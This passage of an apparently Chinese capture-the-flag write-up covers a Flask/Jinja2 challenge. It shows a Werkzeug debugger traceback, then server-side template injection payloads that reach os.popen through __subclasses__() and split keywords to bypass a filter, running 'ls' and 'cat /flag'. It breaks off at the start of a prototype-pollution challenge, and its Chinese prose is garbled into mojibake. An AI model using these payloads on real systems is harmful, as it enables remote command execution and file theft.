class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;frame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;frame-139696630025344&quot;</span>&gt;</span></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>File </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">cite</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;filename&quot;</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;lt;</span>unknown<span class="hljs-symbol">&amp;gt;</span>&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">cite</span>&gt;</span></span><span class="language-xml">,</span><br><span class="language-xml">      line </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;line&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span></span><span class="language-xml">,</span><br><span class="language-xml">      in </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">code</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;function&quot;</span>&gt;</span>template<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;source &quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span>&gt;</span>jinja2.exceptions.TemplateSyntaxError: tag name expected</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;plain&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      This is the Copy/Paste friendly version of the traceback.</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">readonly</span>&gt;</span>Traceback (most recent call last):</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2213, in __call__</span><br><span class="language-xml">    return self.wsgi_app(environ, start_response)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2193, in wsgi_app</span><br><span class="language-xml">    response = self.handle_exception(e)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2190, in wsgi_app</span><br><span class="language-xml">    response = self.full_dispatch_request()</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1486, in full_dispatch_request</span><br><span class="language-xml">    rv = self.handle_user_exception(e)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1484, in full_dispatch_request</span><br><span class="language-xml">    rv = self.dispatch_request()</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1469, in dispatch_request</span><br><span class="language-xml">    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/app/app.py<span class="hljs-symbol">&amp;#34;</span>, line 21, in hello</span><br><span class="language-xml">    return render_template_string(sign_in)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/templating.py<span class="hljs-symbol">&amp;#34;</span>, line 162, in render_template_string</span><br><span class="language-xml">    template = app.jinja_env.from_string(source)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 1105, in from_string</span><br><span class="language-xml">    return cls.from_code(self, self.compile(source), gs, None)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 768, in compile</span><br><span class="language-xml">    self.handle_exception(source=source_hint)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 936, in handle_exception</span><br><span class="language-xml">    raise rewrite_traceback_stack(source=source)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span><span class="hljs-symbol">&amp;lt;</span>unknown<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;#34;</span>, line 2, in template</span><br><span class="language-xml">jinja2.exceptions.TemplateSyntaxError: tag name expected</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br>&lt;/div&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;explanation&quot;</span>&gt;</span></span><br><span class="language-xml">  The debugger caught an exception in your WSGI application.  You can now</span><br><span class="language-xml">  look at the traceback which led to the error.  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nojavascript&quot;</span>&gt;</span></span><br><span class="language-xml">  If you enable JavaScript you can also use additional features such as code</span><br><span class="language-xml">  execution (if the evalex feature is enabled), automatic pasting of the</span><br><span class="language-xml">  exceptions and much more.<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span></span><br><span class="language-xml">        Brought to you by </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;arthur&quot;</span>&gt;</span>DON&#x27;T PANIC<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span><span class="language-xml">, your</span><br><span class="language-xml">        friendly Werkzeug powered traceback interpreter.</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    &lt;/div&gt;<br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pin-prompt&quot;</span>&gt;</span></span><br><span class="language-xml">      </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Console Locked<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">          The console is locked and needs to be unlocked by entering the PIN.</span><br><span class="language-xml">          You can find the PIN printed out on the standard output of your</span><br><span class="language-xml">          shell that runs the server.</span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">          </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>PIN:</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span> <span class="hljs-attr">name</span>=<span class="hljs-string">pin</span> <span class="hljs-attr">size</span>=<span class="hljs-string">14</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">btn</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Confirm Pin&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><br>&lt;!--<br><br>Traceback (most recent call<span class="hljs-built_in"> last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2213</span>, <span class="hljs-keyword">in</span> __call_<span class="hljs-number">_</span><br>    <span class="hljs-keyword">return</span> self.wsgi_app(environ, start_response)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2193</span>, <span class="hljs-keyword">in</span> wsgi_app<br>    response = self.handle_exception(e)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2190</span>, <span class="hljs-keyword">in</span> wsgi_app<br>    response = self.full_dispatch_request()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1486</span>, <span class="hljs-keyword">in</span> full_dispatch_request<br>    rv = self.handle_user_exception(e)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1484</span>, <span class="hljs-keyword">in</span> full_dispatch_request<br>    rv = self.dispatch_request()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1469</span>, <span class="hljs-keyword">in</span> dispatch_request<br>    <span class="hljs-keyword">return</span> self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)<br>  File <span class="hljs-string">&quot;/app/app.py&quot;</span>, line <span class="hljs-number">21</span>, <span class="hljs-keyword">in</span> hello<br>    <span class="hljs-keyword">return</span> render_template_string(sign_in)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/templating.py&quot;</span>, line <span class="hljs-number">162</span>, <span class="hljs-keyword">in</span> render_template_string<br>    template = app.jinja_env.from_string(source)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">1105</span>, <span class="hljs-keyword">in</span> from_string<br>    <span class="hljs-keyword">return</span> cls.from_code(self, self.compile(source), gs, None)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">768</span>, <span class="hljs-keyword">in</span> compile<br>    self.handle_exception(source=source_hint)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">936</span>, <span class="hljs-keyword">in</span> handle_exception<br>    raise rewrite_traceback_stack(source=source)<br>  File <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>, line <span class="hljs-number">2</span>, <span class="hljs-keyword">in</span> template<br>jinja2.exceptions.TemplateSyntaxError: tag<span class="hljs-built_in"> name</span> expected<br><br><br>--&gt;<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æƒ³äº†æŒºä¹…ä¸çŸ¥é“ä¸ºå•¥å‡ºè¿™ä¸ªé¡µé¢ï¼Œåé¢æ³¨æ„åˆ°è¿™é‡Œé¢æœ‰ä¸ª<code>Debug</code>ï¼Œå¾ˆæ˜æ˜¾æ˜¯æˆ‘ä»¬çš„è¾“å…¥æœ‰é—®é¢˜ï¼Œå°è¯•è®¿é—®ï¼š<code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[%22`å°±æ˜¯åŠ å·ä¹‹å‰çš„é‚£éƒ¨åˆ†ï¼Œæœç„¶è¿›å…¥äº†`Debug`ç•Œé¢ï¼š![genshin9](img/genshin9.png)`payload`ä¸­çš„`+`è¢«æ›¿æ¢æˆç©ºæ ¼äº†ï¼š`/secr3tofpop?name=++1++`![genshin10](img/genshin10.png)![genshin11](img/genshin11.png)è¿™é‡Œå¯ä»¥æ‰¾åˆ°éƒ¨åˆ†å’Œ`waf`æœ‰å…³çš„ä»£ç ï¼Œä½†`waf`å…·ä½“æ˜¯ä»€ä¹ˆä¸çŸ¥é“ã€‚å…¶å®åœ¨`%7b%%20print([].__class__.__base__.__subclasses__())%20%%7D`ç•Œé¢æ˜¯èƒ½æœç´¢åˆ°å¸¦æœ‰`os`çš„æ¨¡å—çš„ï¼Œæ€»ä¸èƒ½è®©æˆ‘ä¸€ä¸ªä¸€ä¸ªå»æ•°å§ã€‚ã€‚æƒ³äº†æƒ³å†™å‡ºä¸ªè¿™ä¸ªä¸œè¥¿ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>a = <span class="hljs-string">&quot;&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;&quot;</span><br><br><br><span class="hljs-comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–ç±»å</span><br>class_names = re.findall(<span class="hljs-string">r&quot;&lt;class &#x27;([^&#x27;]+)&#x27;&quot;</span>, a)<br><br><span class="hljs-comment"># è¾“å‡ºæ•´ä¸ªæ•°ç»„</span><br><span class="hljs-built_in">print</span>(class_names)<br><br><span class="hljs-comment"># è¾“å‡º&#x27;int&#x27;æ‰€åœ¨çš„ä½ç½®</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;int æ‰€åœ¨çš„ä½ç½®:&quot;</span>, class_names.index(<span class="hljs-string">&quot;os._wrap_close&quot;</span>))<br><br><span class="hljs-comment">#132</span><br></code></pre></td></tr></table></figure>å¸¦æœ‰`Printer`å’Œ`Error`çš„æ¨¡å—æ²¡æ‰¾åˆ°ï¼Œå°±å»æ‰¾å¸¦æœ‰`os`çš„äº†ç„¶ååˆ©ç”¨`.__init__.__globals__['os']`å»è®¿é—®`os`è¿™ä¸ªæ¨¡å—ä»¥è°ƒç”¨å‡½æ•°ï¼š`secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132].__init__.__globals__[%27os%27])%20%&#125;</code></p><p>åˆè§¦å‘äº†è¿‡æ»¤ã€‚ã€‚å°è¯•åå‘ç°<code>init</code>è¿™ä¸œè¥¿ä¸è®©ç”¨(åŒæ—¶è¿‡æ»¤å¤§å°å†™)ï¼Œå‚è€ƒï¼š<code>[SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰_sstiç»•è¿‡-CSDNåšå®¢](https://blog.csdn.net/miuzzx/article/details/110220425)</code></p><p><code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132])%20%&#125;</code></p><p>è€ƒè™‘ä½¿ç”¨æ‹¼æ¥ç»•è¿‡ï¼š</p><p><code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132][%22__in%22+%22it__%22][%22__glo%22+%22bals__%22][%22po%22%22pen%22](%22ls%22).read())%20%&#125;</code></p><p><img src="/img/genshin14.png" alt="genshin14"></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/secr3tofpop?name=&#123;%%<span class="hljs-number">20</span><span class="hljs-keyword">print</span>([].__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>][%22__in%22+%22it__%22][%22__glo%22+%22bals__%22][%22po%22%22pen%22](%22cat%20/flag%22).read())%20%&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/genshin13.png" alt="genshin13"></p><p>è¿™é¢˜è§£æ³•ä¸€å¤§å †ï¼Œå…¶å®ƒ<code>payload</code>å¯ä»¥å‚è€ƒï¼š<code>https://www.cnblogs.com/Article-kelp/p/14797393.html#5228271</code></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>æç¤ºï¼šrainâ€¦ spreadâ€¦ polluteâ€¦ï¼Œåˆæ­¥åˆ¤æ–­åŸå‹é“¾æ±¡æŸ“</p><p><img src="/img/otengirl1.png" alt="otengirl1"></p><p>ä¸‹è½½<code>o.zip</code>é™„ä»¶ï¼š</p><p><img src="/img/otengirl2.png" alt="otengirl2"></p><p>ã€‚ã€‚ã€‚ã€‚å¤ªå¤šäº†ï¼Œ<code>hint.txt</code>æ‰“å¼€å‘ç°æ˜¯æ®µæ—¥è¯­ï¼š<code>ã€ã€Œroutesã€ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã ã‘ã‚’è¦‹ã¦ãã ã•ã„ã€‚SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã€ã¨å¾¡å‚å¾¡å‚ã¯æœŸå¾…ã«æº€ã¡ãŸæ°—æŒã¡ã§è¨€ã£ãŸã€‚</code></p><p>ç¿»è¯‘ï¼š<code>å¾¡å‚å¾¡å‚æ»¡æ€€æœŸå¾…åœ°è¯´é“ï¼šâ€œè¯·åªæŸ¥çœ‹&#39;routes&#39;æ–‡ä»¶å¤¹ã€‚æ²¡æœ‰SQLæ³¨å…¥é—®é¢˜ã€‚</code></p><p>é‚£å°±çœ‹çœ‹<code>routes</code>:</p><p><img src="/img/otengirl4.png" alt="otengirl4"></p><p>é¦–å…ˆæ˜¯<code>info.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 